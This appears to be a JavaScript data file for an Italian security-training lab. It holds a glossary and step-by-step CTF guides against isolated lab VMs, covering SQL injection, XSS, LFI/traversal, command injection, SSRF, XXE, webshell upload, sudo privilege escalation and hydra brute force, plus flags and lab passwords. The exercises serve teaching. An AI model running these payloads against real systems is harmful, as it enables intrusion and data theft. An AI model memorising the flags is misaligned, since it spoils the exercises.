/**
 * Guide didattiche Laboratorio Virtuale — passo passo + glossario termini.
 * Placeholder nel testo: {{chiave}} o {{chiave|testo visibile}}
 */
(function () {
  const G = {
    'jump-box': 'Macchina di partenza controllata da cui lanci i test verso le VM isolate del lab, senza toccare reti esterne.',
    vlan: 'Virtual LAN: segmento di rete logico isolato. Nel lab EVIL le VM vivono in una VLAN dedicata (10.42.x.x).',
    nmap: 'Network Mapper: scanner per scoprire host attivi, porte aperte e versioni dei servizi in ascolto.',
    'port-scan': 'Scansione delle porte TCP/UDP di un host per capire quali servizi espone (web, SSH, SMB, ecc.).',
    ping: 'Comando ICMP per verificare se un host risponde in rete prima di scansionarlo in profondità.',
    ssh: 'Secure Shell: protocollo cifrato (porta 22) per accesso remoto a shell su server Linux/Unix.',
    curl: 'Client a riga di comando per inviare richieste HTTP e ispezionare risposte, header e body.',
    http: 'HyperText Transfer Protocol: protocollo con cui browser e API scambiano pagine e dati (porta 80/443).',
    sqli: 'SQL Injection: input utente concatenato nella query SQL senza filtri, permettendo bypass o estrazione dati.',
    payload: 'Stringa o comando crafted per sfruttare una vulnerabilità (es. \' OR \'1\'=\'1 in un login).',
    xss: 'Cross-Site Scripting: script malevolo iniettato in una pagina ed eseguito nel browser della vittima.',
    csrf: 'Cross-Site Request Forgery: trick che fa eseguire azioni autenticate (cambio email, transfer) senza consenso.',
    lfi: 'Local File Inclusion: il server include file locali scelti dall\'attaccante tramite parametro non validato.',
    'directory-traversal': 'Tecnica che usa ../ per risalire le cartelle e leggere file fuori dalla web root.',
    dirb: 'Directory brute forcer: prova migliaia di path comuni (/admin, /backup) su un web server.',
    hydra: 'Tool di brute force online: prova liste di password su login SSH, FTP, HTTP e altri servizi.',
    'brute-force': 'Attacco che tenta sistematicamente molte password o PIN finché uno non funziona.',
    smb: 'Server Message Block: protocollo Windows/Linux per condivisioni di file e stampanti (porte 445/139).',
    smbclient: 'Client Samba per elencare share di rete e scaricare file da risorse SMB.',
    privesc: 'Privilege escalation: passaggio da utente limitato a privilegi più alti (es. root).',
    sudo: 'Comando Linux che esegue programmi con privilegi elevati secondo regole in /etc/sudoers.',
    flag: 'Stringa segreta in formato CTF che conferma il completamento di un obiettivo didattico nel lab.',
    ctf: 'Capture The Flag: esercizio di sicurezza in cui recuperi flag nascoste dimostrando una competenza.',
    ricognizione: 'Fase iniziale di un pentest: raccogliere informazioni su rete, servizi e superficie d\'attacco.',
    banner: 'Messaggio iniziale di un servizio (es. versione OpenSSH) utile per identificare software vulnerabile.',
    wordlist: 'Lista di password o path usata da tool come hydra o dirb per attacchi automatizzati.',
    token: 'Valore segreto nel form che prova che la richiesta proviene dalla sessione legittima dell\'utente.',
    post: 'Metodo HTTP che invia dati nel body (es. form login) invece che solo nell\'URL.',
    share: 'Cartella di rete esposta via SMB a cui client autorizzati possono accedere.',
    'command-injection': 'Input utente concatenato a comandi di sistema (ping, exec) — permette di eseguire shell command arbitrari.',
    ssrf: 'Server-Side Request Forgery: il server fa richieste HTTP verso URL scelti dall\'attaccante, anche verso rete interna.',
    idor: 'Insecure Direct Object Reference: cambiare un ID nell\'URL/API espone record di altri utenti senza autorizzazione.',
    jwt: 'JSON Web Token: token firmato che attesta identità/ruolo; se mal implementato permette escalation di privilegi.',
    xxe: 'XML External Entity: entità XML che forza il parser a leggere file locali o fare richieste di rete.',
    entity: 'Dichiarazione XML <!ENTITY> che definisce contenuto riutilizzabile — sfruttabile in attacchi XXE.',
    webshell: 'Script (es. PHP) caricato sul server che offre una shell remota all\'attaccante.',
    ftp: 'File Transfer Protocol (porta 21): trasferimento file; login anonymous spesso espone dati pubblici per errore.',
    anonymous: 'Accesso FTP/SMB senza credenziali reali — utile ai legittimi owner ma pericoloso se mal configurato.',
    api: 'Application Programming Interface: endpoint machine-readable (spesso JSON) da testare per auth e IDOR.',
    authorization: 'Header HTTP (es. Bearer token) che prova chi sei — va validato lato server ad ogni richiesta.',
    'internal-network': 'Segmento non esposto a Internet (RFC1918) raggiungibile solo da server interni — bersaglio classico SSRF.',
  };

  const STUDY = {
    'network-recon': {
      title: 'Ricognizione di rete',
      intro: 'Prima di attaccare, mappa cosa esiste in rete: host vivi, porte aperte e servizi.',
      steps: [
        {
          title: 'Connettiti alla jump box',
          body: 'Ogni sessione parte dalla {{jump-box|jump box}} EVIL (10.42.0.2): un punto sicuro dentro la {{vlan|VLAN}} lab.',
        },
        {
          title: 'Verifica che il target risponda',
          body: 'Usa {{ping|ping}} sul IP assegnato al lab per confermare che la VM target sia accesa.',
          command: 'ping 10.42.10.5',
        },
        {
          title: 'Scansiona porte e servizi',
          body: '{{nmap|nmap}} con -sV esegue una {{port-scan|scansione porte}} e tenta il {{banner|banner grabbing}} delle versioni.',
          command: 'nmap -sV 10.42.10.5',
        },
        {
          title: 'Interpreta l\'output',
          body: 'Cerca righe STATE open: ogni porta indica un servizio ({{ssh|SSH}}, {{http|HTTP}}, HTTPS). Annota cosa potresti testare dopo.',
        },
        {
          title: 'Consegna la flag',
          body: 'Quando hai completato la {{ricognizione|ricognizione}}, invia la {{flag|flag}} con submit flag.',
          command: 'submit flag EVIL{recon_complete}',
        },
      ],
    },
    'web-app-01': {
      title: 'SQL Injection sul login',
      intro: 'Molti form login costruiscono query SQL concatenando l\'input utente — errore classico e pericoloso.',
      steps: [
        {
          title: 'Trova il servizio web',
          body: 'Con {{nmap|nmap}} individua la porta 80, poi usa {{curl|curl}} per scaricare la pagina di login via {{http|HTTP}}.',
          command: 'curl http://10.42.10.11/login',
        },
        {
          title: 'Analizza il form',
          body: 'Nota i parametri user e pass inviati in {{post|POST}}. Se non sono filtrati, potresti manipolare la query SQL.',
        },
        {
          title: 'Costruisci il payload',
          body: 'Un {{payload|payload}} tipico di {{sqli|SQL injection}} è admin\' OR \'1\'=\'1 — rende la condizione sempre vera.',
          command: 'curl http://10.42.10.11/login -d "user=admin\' OR \'1\'=\'1&pass=x"',
        },
        {
          title: 'Recupera la flag',
          body: 'Se il bypass funziona, la risposta JSON o HTML contiene la {{flag|flag}} da consegnare.',
          command: 'submit flag EVIL{sqli_login_bypass}',
        },
      ],
    },
    'linux-ssh-01': {
      title: 'Accesso SSH con credenziali deboli',
      intro: 'Password prevedibili su SSH restano uno dei vettori più comuni in ambienti mal configurati.',
      steps: [
        {
          title: 'Individua SSH',
          body: '{{nmap|nmap}} sulla porta 22 conferma che {{ssh|SSH}} sia esposto sul target lab.',
          command: 'nmap -p 22 10.42.10.21',
        },
        {
          title: 'Tentativo di login',
          body: 'Con ssh user@IP avvii l\'handshake; il lab chiederà la password (simulazione fedele al protocollo reale).',
          command: 'ssh student@10.42.10.21',
        },
        {
          title: 'Password lab',
          body: 'In didattica si usano {{wordlist|wordlist}} corte. Qui la password è evil2024 — in produzione servirebbero policy forti.',
        },
        {
          title: 'Esplora il filesystem',
          body: 'Dopo l\'accesso, cat legge file locali. Cerca note o config con la {{flag|flag}}.',
          command: 'cat /home/student/notes.txt',
        },
        {
          title: 'Submit',
          body: 'Consegna la {{flag|flag}} trovata per chiudere il lab.',
          command: 'submit flag EVIL{weak_ssh_creds}',
        },
      ],
    },
    'linux-privesc-01': {
      title: 'Privilege escalation via sudo',
      intro: 'Anche con shell limitata, misconfigurazioni sudo possono regalare root.',
      steps: [
        {
          title: 'Accedi come utente dev',
          body: 'Stesso flusso {{ssh|SSH}} del lab precedente: credenziali dev / devlab.',
          command: 'ssh dev@10.42.10.22',
        },
        {
          title: 'Controlla cosa puoi eseguire',
          body: '{{sudo|sudo}} -l elenca comandi eseguibili come root senza password — gold mine per {{privesc|privilege escalation}}.',
          command: 'sudo -l',
        },
        {
          title: 'Abusa di find',
          body: 'Se find è permesso, -exec può lanciare /bin/sh con privilegi elevati (GTFOBins classico).',
          command: 'sudo find . -exec /bin/sh \\; -quit',
        },
        {
          title: 'Leggi file di root',
          body: 'Con uid=0 accedi a /root/flag.txt e recupera la {{flag|flag}}.',
          command: 'cat /root/flag.txt',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{sudo_find_shell}',
        },
      ],
    },
    'xss-reflected': {
      title: 'XSS riflesso',
      intro: 'L\'input viene rimandato subito nella pagina senza encoding — il browser lo esegue come codice.',
      steps: [
        {
          title: 'Trova il parametro vulnerabile',
          body: 'Ispeziona /search con {{curl|curl}}: il parametro q compare nella risposta HTML.',
          command: 'curl "http://10.42.10.12/search?q=test"',
        },
        {
          title: 'Capire il rischio XSS',
          body: '{{xss|Cross-Site Scripting}} riflesso permette di iniettare JavaScript eseguito dalla vittima che visita il link.',
        },
        {
          title: 'Inietta script',
          body: 'Un {{payload|payload}} minimo è <script>alert(1)</script> — in lab dimostra l\'esecuzione, non danneggia sistemi reali.',
          command: 'curl "http://10.42.10.12/search?q=<script>alert(1)</script>"',
        },
        {
          title: 'Flag e submit',
          body: 'La risposta contiene un commento HTML con la {{flag|flag}}.',
          command: 'submit flag EVIL{xss_reflected}',
        },
      ],
    },
    'lfi-web': {
      title: 'Local File Inclusion',
      intro: 'Il server include file locali basandosi su un parametro controllabile dall\'attaccante.',
      steps: [
        {
          title: 'Endpoint vulnerabile',
          body: 'Cerca parametri come file= in URL {{http|HTTP}} — spesso includono pagine PHP senza whitelist.',
          command: 'curl "http://10.42.10.15/view?file=index.php"',
        },
        {
          title: 'Directory traversal',
          body: '{{directory-traversal|Directory traversal}} con ../ risale le cartelle per uscire dalla web root.',
        },
        {
          title: 'Leggi /etc/passwd',
          body: 'Classico proof-of-concept {{lfi|LFI}}: leggere file di sistema noti.',
          command: 'curl "http://10.42.10.15/view?file=../../../etc/passwd"',
        },
        {
          title: 'Submit flag',
          command: 'submit flag EVIL{lfi_traversal}',
        },
      ],
    },
    'csrf-web': {
      title: 'CSRF su cambio email',
      intro: 'Senza token anti-CSRF, un sito malevolo può far eseguire azioni al browser già autenticato.',
      steps: [
        {
          title: 'Ispeziona il form',
          body: 'Con {{curl|curl}} verifica se il form /account/email ha un {{token|token}} nascosto o header di protezione.',
          command: 'curl http://10.42.10.13/account/email',
        },
        {
          title: 'Capire CSRF',
          body: '{{csrf|CSRF}} sfrutta la sessione cookie della vittima: il server accetta richieste {{post|POST}} cross-origin.',
        },
        {
          title: 'Simula richiesta forgata',
          body: 'Invia email=attacker@evil.lab senza token — il lab accetta l\'azione (vulnerabilità intenzionale).',
          command: 'curl -d "email=attacker@evil.lab" http://10.42.10.13/account/email',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{csrf_no_token}',
        },
      ],
    },
    'dir-discovery': {
      title: 'Scoperta directory nascoste',
      intro: 'Path non linkati possono esporre pannelli admin o backup dimenticati.',
      steps: [
        {
          title: 'Brute force path',
          body: '{{dirb|dirb}} prova una {{wordlist|wordlist}} di directory comuni sul server {{http|HTTP}}.',
          command: 'dirb http://10.42.10.14/',
        },
        {
          title: 'Analizza risultati',
          body: 'Cerca codici 200 su path sensibili come /admin — indicano risorse non pubblicizzate.',
        },
        {
          title: 'Scarica la flag',
          body: 'Usa {{curl|curl}} sul path trovato per leggere flag.txt.',
          command: 'curl http://10.42.10.14/admin/flag.txt',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{hidden_admin_path}',
        },
      ],
    },
    'brute-force-ssh': {
      title: 'Brute force SSH con hydra',
      intro: 'Password deboli cadono sotto attacchi automatizzati — ecco perché servono policy e MFA.',
      steps: [
        {
          title: 'Conferma il servizio',
          body: '{{nmap|nmap}} su porta 22 verifica {{ssh|SSH}} attivo prima di lanciare {{brute-force|brute force}}.',
          command: 'nmap -p 22 10.42.10.23',
        },
        {
          title: 'Lancia hydra',
          body: '{{hydra|Hydra}} prova user admin con una {{wordlist|wordlist}} lab — in produzione il lockout fermerebbe questo.',
          command: 'hydra -l admin -P /usr/share/wordlists/lab.txt ssh://10.42.10.23',
        },
        {
          title: 'Leggi il report',
          body: 'Hydra stampa login e password trovati più la {{flag|flag}} didattica.',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{hydra_ssh_win}',
        },
      ],
    },
    'smb-enum': {
      title: 'Enumerazione condivisioni SMB',
      intro: 'Share SMB mal configurate possono esporre backup e credenziali in chiaro.',
      steps: [
        {
          title: 'Scansiona SMB',
          body: 'Porte 445/139 indicano {{smb|SMB}}. {{nmap|nmap}} -p 445 conferma microsoft-ds aperto.',
          command: 'nmap -p 445 10.42.10.31',
        },
        {
          title: 'Elenca le share',
          body: '{{smbclient|smbclient}} -L con guest (-N) lista {{share|share}} accessibili anonimamente.',
          command: 'smbclient -L //10.42.10.31 -N',
        },
        {
          title: 'Scarica flag.txt',
          body: 'Connetti alla share backup e scarica il file con -c "get flag.txt".',
          command: 'smbclient //10.42.10.31/backup -N -c "get flag.txt"',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{smb_open_share}',
        },
      ],
    },
    'command-injection': {
      title: 'OS Command Injection',
      intro: 'Quando input web finisce in system(), un ; o | può eseguire comandi arbitrari sul server.',
      steps: [
        {
          title: 'Trova il parametro vulnerabile',
          body: 'Endpoint come /ping?host= spesso passano il valore a ping o exec senza escape.',
          command: 'curl "http://10.42.10.16/ping?host=127.0.0.1"',
        },
        {
          title: 'Capire command injection',
          body: '{{command-injection|Command injection}} concatena comandi shell: host=127.0.0.1;whoami esegue whoami dopo ping.',
        },
        {
          title: 'Payload e flag',
          body: 'Se vedi uid=www-data la {{payload|payload}} ha funzionato — recupera la {{flag|flag}}.',
          command: 'curl "http://10.42.10.16/ping?host=127.0.0.1;whoami"',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{cmd_injection}',
        },
      ],
    },
    'ssrf-web': {
      title: 'Server-Side Request Forgery',
      intro: 'Il server fa fetch di URL forniti dall\'utente — puoi colpire servizi interni non raggiungibili dall\'esterno.',
      steps: [
        {
          title: 'Endpoint fetch',
          body: 'Cerca parametri url=, link=, path= in {{api|API}} o pagine di anteprima.',
          command: 'curl "http://10.42.10.17/fetch?url=http://example.com"',
        },
        {
          title: 'Rete interna',
          body: '{{ssrf|SSRF}} verso {{internal-network|rete interna}} (es. 10.42.0.99) bypassa firewall perimetrale.',
        },
        {
          title: 'Metadata / flag',
          command: 'curl "http://10.42.10.17/fetch?url=http://10.42.0.99/internal/flag"',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{ssrf_internal}',
        },
      ],
    },
    'idor-api': {
      title: 'IDOR su API',
      intro: 'OWASP Top 10: riferimenti diretti a oggetti senza controllo autorizzazioni.',
      steps: [
        {
          title: 'Profilo corrente',
          body: 'Nota il tuo id=1000 nella risposta {{api|API}} JSON.',
          command: 'curl "http://10.42.10.18/api/user?id=1000"',
        },
        {
          title: 'Manipola l\'ID',
          body: '{{idor|IDOR}}: incrementa id per leggere dati admin o di altri utenti.',
          command: 'curl "http://10.42.10.18/api/user?id=1001"',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{idor_user_data}',
        },
      ],
    },
    'jwt-weak': {
      title: 'JWT e autorizzazione API',
      intro: 'Token JWT mal gestiti permettono accesso admin — fondamentale in pentest API moderni.',
      steps: [
        {
          title: 'Richiesta negata',
          body: 'Senza {{authorization|Authorization}} header la {{api|API}} risponde 403.',
          command: 'curl http://10.42.10.19/api/profile',
        },
        {
          title: 'Token admin lab',
          body: 'In lab usi un {{jwt|JWT}} predefinito; in realtà testeresti firma debole, alg none, secret leak.',
          command: 'curl -H "Authorization: Bearer evil.admin.token.lab" http://10.42.10.19/api/profile',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{jwt_admin_role}',
        },
      ],
    },
    'file-upload': {
      title: 'Upload non validato',
      intro: 'Permettere .php/.jsp executable sul web root equivale a regalare una {{webshell|webshell}}.',
      steps: [
        {
          title: 'Form upload',
          body: 'Ispeziona enctype multipart/form-data con {{curl|curl}}.',
          command: 'curl http://10.42.10.20/upload',
        },
        {
          title: 'Carica shell',
          body: 'curl -F invia file; se il server salva in /uploads eseguibile, game over.',
          command: 'curl -F "file=@shell.php" http://10.42.10.20/upload',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{upload_webshell}',
        },
      ],
    },
    'xxe-xml': {
      title: 'XML External Entity',
      intro: 'Parser XML legacy risolvono {{entity|entità}} esterne — lettura file e SSRF via XML.',
      steps: [
        {
          title: 'Endpoint XML',
          body: 'Cerca POST che accettano application/xml o text/xml.',
          command: 'curl -d "<user>test</user>" http://10.42.10.24/api/parse',
        },
        {
          title: 'Payload XXE',
          body: '{{xxe|XXE}} con <!ENTITY x SYSTEM "file:///etc/hostname"> forza il server a includere file locali.',
          command: 'curl -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/hostname">]><user>&x;</user>\' http://10.42.10.24/api/parse',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{xxe_entity}',
        },
      ],
    },
    'ftp-anonymous': {
      title: 'FTP anonymous',
      intro: 'Servizi {{ftp|FTP}} dimenticati con login {{anonymous|anonymous}} espongono spesso backup e config.',
      steps: [
        {
          title: 'Scopri FTP',
          body: '{{nmap|nmap}} porta 21 identifica vsftpd o ProFTPD.',
          command: 'nmap -p 21 10.42.10.32',
        },
        {
          title: 'Login anonymous',
          body: 'User anonymous, password vuota o email@ — elenca e scarica file.',
          command: 'ftp anonymous@10.42.10.32',
        },
        {
          title: 'Scarica flag',
          command: 'ftp anonymous@10.42.10.32 -c "get flag.txt"',
        },
        {
          title: 'Submit',
          command: 'submit flag EVIL{ftp_anonymous}',
        },
      ],
    },
  };

  window.VLAB_GLOSSARY = G;
  window.VLAB_STUDY = STUDY;
})();
